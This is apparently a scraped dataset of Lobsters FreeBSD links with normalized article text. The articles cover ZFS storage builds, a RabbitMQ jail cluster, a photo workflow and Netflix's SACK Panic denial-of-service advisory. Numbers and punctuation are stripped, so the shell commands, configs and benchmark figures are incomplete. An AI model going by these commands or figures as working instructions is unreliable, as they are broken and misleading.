236,Lobsters,freebsd,FreeBSD,bhyvearm64 CPU and Memory Virtualization on Armv8.0-A by Alexandru Elisei,https://www.youtube.com/watch?v=rh3-62HHkYY,cpu memory virtualization alexandru elisei,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature cpu memory virtualization alexandru elisei youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature cpu memory virtualization alexandru elisei youtube
237,Lobsters,freebsd,FreeBSD,FreeBSD Enterprise 1 PB Storage,https://vermaden.wordpress.com/2019/06/19/freebsd-enterprise-1-pb-storage/,freebsd enterprise pb storage,hardware management interface biosuefi freebsd system purpose performance freenas hardware management interface biosuefi freebsd system zfs boot environment disk preparation gb gb gpart show zfs pool configuration zpool status zfs setting redundantmetadataall grep vfszfs bootloaderconf network configuration intel cisco nexus configuration freebsd configuration purpose pkg search swift ibm spectrum protect tsm performance network performance disk subsystem performance mb mb mb intel ssd dc gb mb mb iop iop usage randomio filename nrthreads writefractionofio fsyncfractionofwrites iosize nrsecondsbetweensamples filename writefractionofio fsyncfractionofwrites iosize nrsecondsbetweensamples freenas pkg audit f uname freebsdversion uk sockstat freenas vulnerability update bsd freebsd enterprise pb storage bsd changing face unix update real life picture data center like,today freebsd operating system turn year old june international freebsd day got something special today using freebsd enterprise storage solution real hardware freebsd shine storage feature zfs included today show built called enterprise storage based freebsd system along pb petabyte raw capacity build various storage related system based freebsd project different much storage space squeeze single system turn lot definitely pb tb raw storage space non clickable table content hardware management interface biosuefi freebsd system disk preparation zfs pool configuration zfs setting network configuration freebsd configuration purpose performance network performance disk subsystem performance freenas update bsd update real life picture data center hardware server drive slot allow pack terabyte data tb drive example system would use first one tyan short name glusterfs minio cluster cone virtual hardware even freebsd jail container one us real physical hardware build following specification x intel xeon silver cpu x gb ram gb total x intel ssd dc gb system x toshiba hdd tb data x broadcom controller x intel card x power supply price whole system drive included look one thing need rack cabinet mm long fit monster management interface called light management interface really nice bloated well organized work quite fast create several separate user account connect external user service like ldapadradius example logging simple dashboard welcome u access various sensor information available temperature system component system inventory information installed hardware separate setting menu various setup option know remote control remote console without need third party plugins like welcomed work well one course allowed power onoffcycle box remotely maintenance menu bios update biosuefi booting biosuefi setup possible select drive boot screenshots two ssd drive prepared system biosuefi interface show two enclosure two broadcom controller drive attached via first broadcom controller rest attached via second one call enclosure instead od controller reason freebsd system chosen latest freebsd purpose installation generally default installation zfs mirror two ssd disk nothing special installation course support zfs boot environment bulletproof upgradeschanges feature zpool list zroot name size alloc free ckpoint expandsz frag cap dedup health altroot zroot online zpool status zroot pool zroot state online scan none requested config name state read write cksum zroot online online online online error known data error df g filesystem used avail capacity mounted zrootrootdefault devfs dev zroottmp tmp zrootusrhome usrhome zrootusrports usrports zrootusrsrc usrsrc zrootvaraudit varaudit zrootvarcrash varcrash zrootvarlog varlog zrootvarmail varmail zrootvartmp vartmp beadm list active mountpoint space created default nr disk preparation possible setup disk tb capacity chosen go way zfs equivalent course disk group group used zfs pool drive left spare disk play well disk distribution look le like disk content spare total freebsd system see drive camcontrol command sorted attached sa controller scbus camcontrol devlist sort k ahci sgpio enclosure target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata intel target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun tyan target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun tyan target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun tyan target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata toshiba target lun ata intel target lun ata toshiba target lun one ask identify disk failure came freebsd sesutil command come handy sesutil locate sesutil locate first sesutil command disables location light enclosure second one turn identification disk also make sure use whole space drive idea may pointless imagine following situation five tb disk failed year get model drive get tb drive maybe even manufacturer grep varrundmesgboot bus target lun fixed direct access scsi device serial number transfer command queueing enabled byte sector single tb drive byte sector equal byte raw capacity expr image tb drive manufacturer come byte smaller size zfs allow usage size smaller use exactly gb size drive le gb short total gb size command disk camcontrol devlist grep toshiba awk print nf awk f print tr read disk gpart destroy f disk devnull devnull gpart create gpt disk gpart add freebsdzfs disk done gpart show gpt freebsdzfs free zfs pool configuration next create zfs pool probably longest zpool command ever executed toshiba tb disk sector need set vfszfsminautoashift force sysctl vfszfsminautoashift zpool create spare zpool status pool state online scan scrub repaired day error fri may config name state read write cksum online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online online spare avail avail avail avail avail avail error known data error zpool list name size alloc free ckpoint expandsz frag cap dedup health altroot online zfs list name used avail refer mountpoint none zfs setting primary role storage would keeping file use one largest value recordsize mb help getting better compression ratio also serve iscsi target try fit native block thus byte setting iscsi zfs set zfs set atimeoff zfs set mountpointnone zfs set zfs set redundantmetadatamost zfs create zfs create zfs create zfs set also one word redundantmetadata obvious parameter quote zfs man page man zfs redundantmetadataall control type metadata stored redundantly zfs store extra copy metadata single block corrupted amount user data lost limited extra copy addition redundancy provided pool level eg mirroring raidz addition extra copy specified copy property total copy example pool mirrored redundantmetadatamost zfs store copy metadata copy data metadata set zfs store extra copy metadata single ondisk block corrupt worst single block user data recordsize byte long lost set zfs store extra copy type metadata improve performance random writes le metadata must written practice worst block recordsize byte user data lost single ondisk block corrupt exact behavior metadata block stored redundantly may change future release default value description see mostly useful single device pool redundancy based equivalent need keep additional redundant copy metadata help increase write performance record iscsi zfs zvols create command like one sparse file also called thin provisioning mode zfs create v spare disk also need enable zfsd daemon adding zfsdenableyes etcrcconf file also need enable autoreplace property pool default set zpool get autoreplace name property value source autoreplace default zpool set autoreplaceon zpool get autoreplace name property value source autoreplace local zfs setting bootloaderconf file system gb ram let zfs use amount arc grep vfszfs bootloaderconf network configuration really like freebsd setup lacp link aggregation tou need line etcrcconf file red hat enterprise linux would need several file many line head etcrcconf defaultrouter clonedinterfaces laggproto lacp laggport laggport ifconfig metric mtu ether inet netmask broadcast laggproto lacp lagghash laggport laggport group lagg medium ethernet autoselect status active intel network adapter fully supported freebsd ixl driver cisco nexus configuration cisco nexus configuration needed enable lacp aggregation first port connected full connected full aggregation interface description switchport switchport access vlan mtu channelgroup mode active shutdown interface description switchport switchport access vlan mtu vpc samesimilar second cisco nexus switch freebsd configuration three important configuration file freebsd system post setting use storage system etcrcconf file cat etcrcconf network hostname defaultrouter clonedinterfaces laggproto lacp laggport laggport kernel module kldlist kldlist aesni daemon yes zfsenableyes zfsdenableyes sshdenableyes ctldenableyes powerdenableyes daemon nfs server nfsserverenableyes nfsclientenableyes rpclockdenableyes rpcstatdenableyes rpcbindenableyes mountdenableyes mountdflags r dumpdevno bootloaderconf file cat bootloaderconf boot option disable intel ht update intel cpu microcode boot kernel loaded cpumicrocodeloadyes cpumicrocodenamebootfirmwareintelucodebin module zfsloadyes aioloadyes racctrctl resource limit disable memory test boot pipe kva limit mb ipc large page mapping zfs tuning zfs disable panic stale io newcons suspend etcsysctlconf file cat etcsysctlconf zfs ashift security security intel md microarchitectural data sampling mitigation disable annoying thing ipc network purpose one would built appliance lot cheaper get branded one think dell emc data domain example data domain almost highest one data domain least would cost ten time least smaller capacity taking closer three expanders actually make freebsd enterprise storage behave like dell emc data domain like dell emc elastic cloud storage example dell emc cloudboost deployed somewhere vmware stack provide ddboost deduplication would need openstack swift one supported backed device openstack swift package freebsd year behind reality use bhyve pkg search swift highly available distributed eventually consistent objectblob store create bhyve virtual machine freebsd enterprise storage centos system example setup swift work physical core spare gb ram would even noticed way use dell emc networker ten time cheaper storage past also wrote ibm spectrum protect tsm would also greatly benefit freebsd enterprise storage actually also use freebsd based storage space ibm spectrum protect tsm container pool directory exported via iscsi work like charm also compare freebsd enterprise storage storage appliance like ixsystems truenas exagrid performance sure would want know fast freebsd enterprise storage performs share performance data gathered pleasure network performance first network performance user benchmark started server freebsd side started client window server machine c c p sum sec gbytes gbitssec receiver mtu jumbo frame unfortunatelly unfortunatelly system one physical interface test also using two box single interface saturated dual lacp freebsd side nicely also exported nfs iscsi red hat enterprise linux system network performance mb single interface would mb lacp aggregation disk subsystem performance disk subsystem first naive test using diskinfo freebsd builtin tool diskinfo ctv sectorsize mediasize byte mediasize sector stripesize stripeoffset cylinder according firmware head according firmware sector according firmware ata toshiba disk descr disk ident enc celmdesc physical path trimunmap support rotation rate rpm notzoned zone mode io command overhead time read block sec msecsector time read sector sec msecsector calculated command overhead msecsector seek time full stroke iter sec msec half stroke iter sec msec quarter stroke iter sec msec short forward iter sec msec short backward iter sec msec seq outer iter sec msec seq inner iter sec msec transfer rate outside kbytes sec kbytessec middle kbytes sec kbytessec inside kbytes sec kbytessec know fast single disk let repeast test zfs zvol device diskinfo ctv sectorsize mediasize byte mediasize sector stripesize stripeoffset yes trimunmap support unknown rotation rate rpm io command overhead time read block sec msecsector time read sector sec msecsector calculated command overhead msecsector seek time full stroke iter sec msec half stroke iter sec msec quarter stroke iter sec msec short forward iter sec msec short backward iter sec msec seq outer iter sec msec seq inner iter sec msec transfer rate outside kbytes sec kbytessec middle kbytes sec kbytessec inside kbytes sec kbytessec almost gb bad time even oldschool test immortal dd command compressionoff setting one process dd ifdevzero offile statusprogress byte gb gib transferred mb record record byte transferred sec bytessec four concurrent process dd ifdevzero offile x statusprogress byte gb gib transferred mb record record byte transferred sec bytessec eight concurrent process dd ifdevzero offile x statusprogress byte gb gib transferred mb record record byte transferred sec bytessec let summarize data stream mb gb stream mb gb stream mb gb disk subsystem able squeeze gb sustained speed sequential writes u would want saturate would need add additional two interface disk stressed see useful freebsd tool gstat command time intelligent test blogbench test first compression disabled time blogbench frequency sec scratch dir spawning writer spawning rewriter spawning commenters spawning reader benchmarking iteration test run minute final score writes final score read blogbench user system cpu total second compression set time blogbench frequency sec scratch dir spawning writer spawning rewriter spawning commenters spawning reader benchmarking iteration test run minute final score writes final score read blogbench user system cpu total compression helped much helped comparision run test system zfs pool two intel ssd dc gb drive mirror following feature intel ssd dc gb drive sequential read mb sequential write mb random read span iop random write span iop time blogbench frequency sec scratch dir spawning writer spawning rewriter spawning commenters spawning reader benchmarking iteration test run minute final score writes final score read blogbench user system cpu total randomio test multithreaded disk io microbenchmark usage follows usage randomio filename nrthreads writefractionofio fsyncfractionofwrites iosize nrsecondsbetweensamples filename filename device readwrite writefractionofio fraction io writes example write fsyncfractionofwrites fraction writes fsync iosize many byte readwrite multiple byte nrsecondsbetweensamples many second average sample randomio block zfs create v randomio total read latency m write latency m iop iop min avg max sdev iop min avg max sdev c sector zfs create v randomio total read latency m write latency m iop iop min avg max sdev iop min avg max sdev c randomio test run compression set next bonnie benchmark run compression set bonnie u root using writing byte time done writing intelligently done rewriting done reading byte time done reading intelligently done start em done done done done done create file sequential order done stat file sequential order done delete file sequential order done create file random order done stat file random order done delete file random order done version sequential output sequential input random concurrency per chr block rewrite per chr block seek machine size ksec cp ksec cp ksec cp ksec cp ksec cp sec cp latency version sequential create random create create read delete create read delete file sec cp sec cp sec cp sec cp sec cp sec cp latency last least fio benchmark also compression enabled fio nametest filenamerandomreadwritefio readwriterandrw test rwrandrw b r w ioenginepsync starting process job iop eta test err tue jun read bw kib min iop min write bw kib min iop min max cpu io depth submit complete issued rwts latency run status group job read write dunno satisfied performance freenas originally really wanted use freenas box even installed freenas run nicely security part freenas best output pkg audit command quite scarry root freenas pkg audit f fetching kib vulnerable python null pointer dereference vulnerability cve www http vulnerable curl multiple vulnerability cve cve cve www http vulnerable libgcrypt sidechannel attack vulnerability cve www http vulnerable python null pointer dereference vulnerability cve www http vulnerable pango remote do vulnerability cve www http vulnerable wwwpyrequests information disclosure vulnerability www http vulnerable denial service due null pointer dereference cve www http vulnerable gnupg unsanitized output cve cve www http vulnerable pycryptography tag forgery vulnerability cve www http vulnerable perl multiple vulnerability cve cve cve www http vulnerable multiple issue cve cve cve cve www http vulnerable git fix memory outofbounds remote code execution vulnerability cve cve www http vulnerable gnutls double free invalid pointer access cve cve www http problem installed package found root freenas uname freebsd freenaslocal freebsd head mon may edt root root freenas freebsdversion uk root freenas sockstat user command pid fd proto local address foreign address root root nobody mdnsd nobody mdnsd www nginx www nginx root nginx root nginx root ntpd root ntpd root ntpd root sshd root syslogng nobody mdnsd nobody mdnsd root even tried get explanation freenas outdated insecure package latest version freenas vulnerability thread started forum unfortunatelly policy summarize touchchange version working last got implression security hole recommend use freenas movedto original freebsd system one interesting note installed freebsd wanted import zfs pool created freenas got executing zpool import command zpool import pool id state online status pool last accessed another system action pool imported using name numeric identifier f flag see http config online online online online online online online online online online online online online online online online spare pool id state online status pool last accessed another system action pool imported using name numeric identifier f flag see http config online online online online online online online online online online online online online online online online spare pool id state online status pool last accessed another system action pool imported using name numeric identifier f flag see http config online online online online online online online online online online online online online online online online spare pool id state online status pool last accessed another system action pool imported using name numeric identifier f flag see http config online online online online online online online online online online online online online online online online spare pool id state online status pool last accessed another system action pool imported using name numeric identifier f flag see http config online online online online online online online online online online online online online online online online spare pool id state online status pool last accessed another system action pool imported using name numeric identifier f flag see http config online online online online online online online online online online online online online online online online spare seems freenas zfs little differently create separate pool every target dedicated spare interesting update bsd freebsd enterprise pb storage article featured bsd changing face unix episode thanks mentioning update real life picture data center asked real life picture monster find several pic taken data center front case cabling alternate front view back case cabling top view disk alternate top view disk slot zoom ssd hdd disk eof like like loading related
238,Lobsters,freebsd,FreeBSD,FreeBSD Project Just Turned 26 Years Old,https://www.freebsdfoundation.org/national-freebsd-day/,freebsd project turned year old,freebsd howto guide send u foundation,pleased announce june declared freebsd day join u honoring freebsd project pioneering legacy continuing impact technology freebsd opensource operating system developed university california berkley used billion people around globe freebsd used teach operating system concept university company also develop product freebsd university use research platform fact good chance already using least code derived freebsd everyday life example stream movie via netflix chat friend whatsapp play latest playstation game sensation already using freebsd pioneer opensource technology freebsd modified redesigned meet need user free charge within guideline license june day official name freebsd agreed upon see part email thread love freebsd much help u celebrate anniversary favorite open source operating system following love freebsd much help u celebrate favorite open source operating system following introduce someone freebsd showing freebsd howto guide freebsd virtual box setting minecraft server number thing learn aboutmore history freebsd herehelp promote day sharing graphic social medium send u story company us freebsd great successtell u love freebsd using freebsdday facebook twitter instagram postsconsider donating foundation help u continue support project look forward commemorating anniversary favorite open source operating system june hope join u
239,Lobsters,freebsd,FreeBSD,SACK Panic: remotely-triggered kernel panic related to TCP Selective Acknowledge capability,https://github.com/Netflix/security-bulletins/blob/master/advisories/third-party/2019-001.md,sack panic remotelytriggered kernel panic related tcp selective acknowledge capability,advisory overview detail sack panic linux description fix workaround filter workaround sack slowness linux excess resource usage linux version description fix workaround filter workaround sack slowness freebsd using rack tcp stack description workaround splitlimitpatch workaround excess resource consumption due low ms value linux version description fix workaround filter note acknowledgment,advisory id title linux freebsd kernel multiple tcpbased remote denial service vulnerability release date severity critical overview netflix identified several tcp networking vulnerability freebsd linux kernel vulnerability specifically relate maximum segment size ms tcp selective acknowledgement sack capability serious dubbed sack panic allows remotelytriggered kernel panic recent linux kernel patch address vulnerability patch applied certain mitigation effective recommend affected party enact one described based environment detail sack panic linux description sequence sack may crafted one trigger integer overflow leading kernel panic fix apply patch additionally version linux kernel including require second patch workaround block connection low ms using one supplied filter value filter example apply higher lower limit appropriate environment note filter may break legitimate connection rely low ms also note mitigation effective tcp probing disabled sysctl set appears default value sysctl workaround disable sack processing set note either workaround sufficient necessary apply workarounds sack slowness linux excess resource usage linux version description possible send crafted sequence sack fragment tcp retransmission queue linux kernel prior attacker may able exploit fragmented queue cause expensive linkedlist walk subsequent sack received tcp connection fix apply patch workaround block connection low ms using one supplied filter value filter example apply higher lower limit appropriate environment note filter may break legitimate connection rely low ms also note mitigation effective tcp probing disabled sysctl set appears default value sysctl workaround disable sack processing set note either workaround sufficient necessary apply workarounds sack slowness freebsd using rack tcp stack description possible send crafted sequence sack fragment rack send map attacker may able exploit fragmented send map cause expensive linkedlist walk subsequent sack received tcp connection workaround apply patch splitlimitpatch set netinettcpracksplitlimit sysctl reasonable value limit size sack table workaround temporarily disable rack tcp stack note either workaround sufficient necessary apply workarounds excess resource consumption due low ms value linux version description attacker force linux kernel segment response multiple tcp segment contains byte data drastically increase bandwidth required deliver amount data consumes additional resource cpu nic processing power attack requires continued effort attacker impact end shortly attacker stop sending traffic fix two patch add sysctl enforces minimum ms set sysctl let administrator enforce minimum ms appropriate application workaround block connection low ms using one supplied filter value filter example apply higher lower limit appropriate environment note filter may break legitimate connection rely low ms also note mitigation effective tcp probing disabled sysctl set appears default value sysctl note good system application coding configuration practice limiting write buffer necessary level monitoring connection memory consumption via someminfo aggressively closing misbehaving connection help limit impact attack kind vulnerability acknowledgment originally reported jonathan looney thank eric dumazet providing linux fix support thank bruce curtis providing linux filter thank jonathan lemon alexey kodanev joao martin helping improve linux patch gratefully acknowledge assistance tyler hick testing fix refining information vulnerable version providing assistance disclosure process
240,Lobsters,freebsd,FreeBSD,Manage Photography the UNIX Way,https://vermaden.wordpress.com/2019/06/12/manage-photography-the-unix-way/,manage photography unix way,hardware http approach http tamron sony sigma samyang http enwikipediaorgwikibokeh sony vva gear summary script http githubcomvermadenscripts flow automount removable medium l lh l lh like,using unix many year start think unix way article aim automate accelerate flow importing photo camera storing future use lot time shoot raw jpeg image time raw jpeg file written every picture used one dxo optic proraw therapheedarktable application make raw file shine even mass conversion compared camera jpeg file left one suited best probably best way best version photo also took whole lot time much time needed find way make process fast almost seamless hardware use sony camera superior brand come priceperformance ratio also important feature absent brand example sony amount based camera sony camera offer much small amount money near nikon canon competitor want get grip difference take look sony review dpreview site http available besides priceperformance ratio sony camera funtoo comfortable use something different providing similar better result nikoncanon competition take viewfinder example nikoncanon camera default using optical viewfinder switch lcd panel need manually push button switch painfully slow autofocus actually unusable mode called live view want use viewfinder need switch mode button implemented sony sony camera automatically switch evf attach eye viewfinder switch back lcd automatically take eye autofocus fast viewfinder lcd one example course example nikon camera record movie using viewfinder lcd also sony emount system utilizes newerdifferent idea generally much expensive older amount system even feature canonnikon camera one selling point sony emount camera also small size feature recently switched sony amount sony emount camera approach basically use two sony camera small ultra portable sony iii probably best pocketcompact camera world come priceperformance ratio quite large inch sensor crop factor allows use high iso value without much noise allows shoot indoors low light without much loss quality also tiltable flash point ceiling get extra bounced light low light situation indoors small gem generally feature sony apscfull frame camera menu interface feature small handicapped cripple like lot compact camera fast even feature evf also feature xavc mbit video codec help greatly low light situation course good light condition camera shine even lightfast lens universal full frame depth field equivalent even better apsc camera full frame depth field equivalent better example sony kit lens crop ratio apsc read depth field equivalence http good article dpreview explaining sony camera used sony following lens tamron allrounder sony small bokeh low light friend sigma large bokeh friend samyang manual focus bokeh master checked habit way time usetake smallportable sony iii convenient grab sony house bokeh picture sure bokeh mean please check wikipedia article http enwikipediaorgwikibokeh available rarely used lens made think optimize sony amount camera also sony builtin flash able point get extra light ceiling indoors also needed dedicated external sony hvl flash iso hot shoe made large camera even bigger checked sony portfolio got older sony emount camera instead nice fast autofocus sony camera along xavc video codec useful tiling lcd screen even touch screen allows take photo place touched screen work similar movie touch want focus probably smallest sony apsc body close size sony iii got sony emount lens also missed lens take different route emount system allows one adapt older lens lens turbo adapter ratio get old used minolta md lens emount md lens turbo adapter aliexpress way got small ultimate bokeh machine one downside manual autofocus sony provides nice implementation focus peaking still pleasure use course sony limitation viewfinder example rarely used anyway course intensive outdoor light problematic sometimes without evf someone want evf one get one sony camera much larger provide evf hot shoe generally sony iii powered comparable size sony sony lens powered state lens range sony iii make difference sony iii even fit pocket sony maybe sony lens quite budget spend also recommend sony vva also incorporates fast phase detection autofocus video sony iv offer video still slower contrast autofocus thus imho pointless get record sony iii also us slower contrast based autofocus video fullhd camera also share nice feat charged directly attaching usb micro cable convenient need provide dedicated external charger battery really liked sony grip lot direct control really like sizecompactness sony sony body weight gram sony gram body alone add flash larger lens get idea comparing side sony iii weight gram sony wight gram sony lens attached bad gear summary settled two camera sony iii give depth field full frame equivalent sony lens sony os give depth field full frame equivalent minolta md lens turbo adapter give depth field full frame equivalent script switched shooting rawjpeg image shoot extra fine jpeg image vivid profile ev overburned image part copying image new directory mean picture dcim directory movie private directory first two script come play rename image something useful picture video yyyymmddhhmm x name made two script photorenameimagessh photorenamemoviessh link script posted later article photorenameimagessh us jhead dependency everything named size need addressed video converted using ffmpeg image compressed jpeg quality convert utility imagemagick suite photorequalitysh one may ask convert jpeg lose quality even well check difference one try really hard large zoom find purpose difference negligible also use larger value quite better quality le storage saving take photorequalitysh example consensus comparison original camera jpeg file file compressed quality using convert utility able stop difference maybe one may also worried quality loss video size saving big also tried find difference really hard find storage saving justified least also recently added photoflowsh take two argument first device camera sd card mounted freebsd time second directory photonew picture video dumped renamed compressed put script external wordpress account github http githubcomvermadenscripts flow attached sd card one camera laptop automounted automount solution described automount removable medium directory first argument import script import new picture photonew directory second argument import script find example output importconvertion process took half hour dualcore laptop thinkpad omittedcut large part output char output photoflowsh photonew file converted quality file converted quality file converted quality file converted quality file converted quality file converted quality ffmpeg version copyright c ffmpeg developer guessed channel layout input stream stereo input mov metadata majorbrand xavc minorversion compatiblebrands creationtime duration start bitrate kb stream und video high tv sar dar kb fps tbr tbn tbc default metadata creationtime handlername video medium handler encoder avc coding stream und audio two hz stereo kb default metadata creationtime handlername sound medium handler stream und data none rtmd kb default metadata creationtime handlername timed metadata medium handler timecode stream mapping stream native stream native native press q stop help using using cpu capability avx profile high level core avc codec copyleft http option mehex rccrf nalhrdnone output matroska metadata majorbrand xavc minorversion compatiblebrands encoder stream und video progressive sar dar fps tbn tbc default metadata creationtime handlername video medium handler encoder side data cpb bitrate maxminavg buffer size vbvdelay stream und audio hz stereo fltp kb default metadata creationtime handlername sound medium handler encoder frame lsize global muxing overhead picture look like imported converted running import flow still original movie delete course exa difference size conversion example picture video l lh rwr r vermaden vermaden rwr r vermaden vermaden l lh rwr r vermaden vermaden rwr r vermaden vermaden best saving video time smaller file picture smaller total size difference whole import first original dump camera sd card du scm total convertedimported size rm du scm jpg tail total du scm mkv tail total du scm total import conversion picture went mb movie actually one movie went mb important thing import convert convent without interactive lengthy process script definitely video renamer one may sony related nothing stop modifying file provided camera manufacturer feel free share photography flow eof like like loading related
241,Lobsters,freebsd,FreeBSD,RabbitMQ Cluster on FreeBSD Containers,https://vermaden.wordpress.com/2019/06/05/rabbitmq-cluster-on-freebsd-containers/,rabbitmq cluster freebsd container,distributed object storage minio jail setup rabbitmq installation rabbitmq setup feed queue high availability host command host command command jail setup mkdir p jailbase fetch http echo mkdir p jailrabbit tar unlink xpjf c jailrabbit done rabbitmq installation rabbitmq setup rabbitmq plugins jexec rabbit cat vardbrabbitmqerlangcookie done rabbitmq administrative user http http rabbitmq cluster setup rabbitmq highly available policy highly available mirrored queue feed queue go language installation rabbitmq hello world cat sendgo http githubcomstreadwayamqp go shell setup rabbitmq hello world cat receivego simple benchmark high availability update month rabbitmq rabbitmq cluster freebsd container month rabbitmq july update make rabbitmq use le cpu twitter like,really like small simple dedicated solution one thing well really good maybe like unix much good example approach minio object storage implement protocol distributed clustering erasure code builtin web interface along many feature wrote distributed object storage minio freebsd article rabbitmq another example currently probably popular implementation amqp protocol also come small sleek web interface difference power minio come basic user oriented web interface administrative configuration task need done cli minio web interface allows one createdelete bucket also downloadupload file rabbitmq sophisticated web interface enable need command line anymore everything accomplished using web interface compared messaging solution like activemq apache kafka popular checked google trend query today would like show rabbitmq messaging quite redundant clustered setup mirrored queue find table content jail setup rabbitmq installation rabbitmq setup rabbitmq plugins rabbitmq administrative user rabbitmq cluster setup rabbitmq highly available policy feed queue go language installation simple benchmark high availability update month rabbitmq update make rabbitmq use le cpu possible virtualization possibility available freebsd virtualboxbhyveqemujailsdocker chosen lightweight freebsd container jail legend usual command run host system root user host command command run host system regular user host command command run rabbitx jail rabbitx command jail setup first create base jail setup host system jail container use freebsd system host mkdir p jailbase host fetch http host echo mkdir p jailrabbit tar unlink xpjf c jailrabbit done host empty clean jail add jail configuration etcjailconf file used laptop jail host thus jail configured use wireless interface address also added network address make convenient purpose writing article host cat etcjailconf eof rabbit hosthostname rabbit local interface path jailrabbit execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets eof done host etcjailconf file look configured host cat etcjailconf hosthostname interface path execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets hosthostname interface path execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets start jail host service jail onestart rabbit done starting jail starting jail jail running properly jls jid ip address hostname path time add dns server jail internet connectivity host cat jailrabbit etcresolvconf done nameserver nameserver switch quarterly latest package host sed squarterlylatestg jailrabbit etcpkgfreebsdconf done host grep latest jailrabbit etcpkgfreebsdconf done url pkghttp pkgfreebsdorg abi latest url pkghttp pkgfreebsdorg abi latest rabbitmq installation install rabbitmq package host jexec rabbit env assumealwaysyesyes pkg install rabbitmq echo done bootstrapping pkg pkghttp please wait verifying signature trusted certificate done installing extracting updating freebsd repository catalogue pkg repository freebsd load error access repo file vardbpkgrepofreebsdsqlite failed file directory fetching metatxz b fetching packagesitetxz mib processing entry freebsd repository update completed package processed repository date updating database digest format following package affected checked new package installed rabbitmq number package installed process require mib space mib downloaded fetching mib fetching mib checking integrity done conflicting installing extracting installing creating group creating group rabbitmq gid creating user creating user rabbitmq uid extracting message use runtime port development testing prepend binary path path variable message jail let verify rabbitmq package installed successfully host jexec rabbit rabbitmqctl done usrlocalsbinrabbitmqctl usrlocalsbinrabbitmqctl rabbitmq setup configure etchosts file jail host cat jailrabbit etchosts eof eof done fast verification host cat jailrabbit etchosts grep sort n uniq c rabbitmq package installed need enable start host jexec usrlocaletcrcdrabbitmq rcvar rabbitmq rabbitmqenable default see need set rabbitmqenableyes value etcrcconf file within jail host jexec rabbit sysrc rabbitmqenableyes done rabbitmqenable yes rabbitmqenable yes start rabbitmq jail host jexec rabbit service rabbitmq start done starting rabbitmq starting rabbitmq four rabbitmq instance running list plugins enabled default none rabbitmq plugins rabbitmqplugins list configured e explicitly enabled e implicitly enabled status running rabbit rabbitmqauthbackendcache rabbitmqauthbackendhttp rabbitmqauthbackendldap rabbitmqauthmechanismssl rabbitmqconsistenthashexchange rabbitmqeventexchange rabbitmqfederation rabbitmqfederationmanagement rabbitmqjmstopicexchange rabbitmqmanagement rabbitmqmanagementagent rabbitmqmqtt rabbitmqpeerdiscoveryaws rabbitmqpeerdiscoverycommon rabbitmqpeerdiscoveryconsul rabbitmqpeerdiscoveryetcd rabbitmqrandomexchange rabbitmqrecenthistoryexchange rabbitmqsharding rabbitmqshovel rabbitmqshovelmanagement rabbitmqstomp rabbitmqtop rabbitmqtracing rabbitmqtruststore rabbitmqwebdispatch rabbitmqwebmqtt rabbitmqwebmqttexamples rabbitmqwebstomp rabbitmqwebstompexamples time enable web interface plugin host jexec rabbit rabbitmqplugins enable rabbitmqmanagement done following plugins configured rabbitmqmanagement rabbitmqmanagementagent rabbitmqwebdispatch applying plugin configuration rabbit following plugins enabled rabbitmqmanagement rabbitmqmanagementagent rabbitmqwebdispatch started plugins message jail web interface plugin enabled rabbitmq freebsd jail big e letter mean plugin enabled small e letter mean plugin enabled dependency plugin requested enabled rabbitmqplugins list configured e explicitly enabled e implicitly enabled status running rabbit rabbitmqauthbackendcache rabbitmqauthbackendhttp rabbitmqauthbackendldap rabbitmqauthmechanismssl rabbitmqconsistenthashexchange rabbitmqeventexchange rabbitmqfederation rabbitmqfederationmanagement rabbitmqjmstopicexchange e rabbitmqmanagement e rabbitmqmanagementagent rabbitmqmqtt rabbitmqpeerdiscoveryaws rabbitmqpeerdiscoverycommon rabbitmqpeerdiscoveryconsul rabbitmqpeerdiscoveryetcd rabbitmqrandomexchange rabbitmqrecenthistoryexchange rabbitmqsharding rabbitmqshovel rabbitmqshovelmanagement rabbitmqstomp rabbitmqtop rabbitmqtracing rabbitmqtruststore e rabbitmqwebdispatch rabbitmqwebmqtt rabbitmqwebmqttexamples rabbitmqwebstomp rabbitmqwebstompexamples order create cluster need rabbitmq instance share erlang cookie erlang cookie found vardbrabbitmqerlangcookie freebsd system cat vardbrabbitmqerlangcookie echo noevqnxjdnlajosvwniw need stop rabbitmq change erlang cookie host jexec rabbit service rabbitmq stop done stopping rabbitmq waiting pid stopping rabbitmq waiting pid let set erlang cookie freebsd jail host cat jailrabbit vardbrabbitmqerlangcookie eof rabbitmqfreebsdjails eof done need start host jexec rabbit service rabbitmq start done starting rabbitmq starting rabbitmq fast verification host jexec rabbit cat vardbrabbitmqerlangcookie done 